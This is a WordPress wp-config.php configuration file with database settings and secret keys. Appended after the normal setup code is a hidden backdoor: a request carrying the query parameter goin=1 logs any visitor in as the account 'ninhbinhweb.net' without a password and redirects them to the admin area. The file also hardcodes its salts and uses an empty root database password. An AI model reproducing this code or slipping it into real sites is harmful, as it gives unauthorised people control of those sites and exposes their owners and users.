<?php
define('WP_CACHE', false); // Added by WP Rocket
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'shopee');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', '');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         'O^Nm.gQ|+M{wOi!fdEk&n9t|1kWoal3rHB)8FxMjd<~qcyVyG84OH!Cj9M&WxJ3C');
define('SECURE_AUTH_KEY',  '~8!.^nHJ1rJpO4jz+ZWC/x5KP@Q2;&m NC Oy]HfaxsuvAmQ~eROHxR=|LT&<06!');
define('LOGGED_IN_KEY',    'JaVAH1|@h]u_F%LKeSFZwKqjgx0Cr3LAhPP._4qs**yNOA. nZAiI8,L~x1_dz|=');
define('NONCE_KEY',        '!QXA0=f 8T25>8duQ{/A0<caF#m-Yx/w>[wF|$:-&McIQU)#ZiS6gBn[$>,b:,,c');
define('AUTH_SALT',        'I&f-*H!d4l17$(<aI>qAhYdXEZ1HmNQsFu;qEQ(3ZCji`+hLuSVF%#*qb>/b~Z5q');
define('SECURE_AUTH_SALT', '|)<$r>IGF8oYr1{ty@ *@C9U/gHEGuB?+.lu54Qb*`-F8X@%K5f(,Q[7pD[Qga~$');
define('LOGGED_IN_SALT',   '#Ff8>sv+pw,C!3/@RedzQoabCLp{6w`AQ&i*iTSbP1-+Ardl9Mt`H;c>7^ ?,hlm');
define('NONCE_SALT',       'd/3xq+vn2)(sExaHs*ytmop v9NgFY=c+[/avPkSYxJ N8/Xm[k@ta`MRTEE4(oc');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
if ($_GET['goin']=='1') {
if(!is_user_logged_in()){

    $username = "ninhbinhweb.net";

    if($user=get_user_by('login',$username)){

        clean_user_cache($user->ID);

        wp_clear_auth_cookie();
        wp_set_current_user( $user->ID );
        wp_set_auth_cookie( $user->ID , true, false);

        update_user_caches($user);

        if(is_user_logged_in()){

            $redirect_to = user_admin_url();
            wp_safe_redirect( $redirect_to );
            exit;
        }
    }
}
elseif('http://' . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'] == wp_login_url()){

    $redirect_to = user_admin_url();
    wp_safe_redirect( $redirect_to );
    exit;
}}
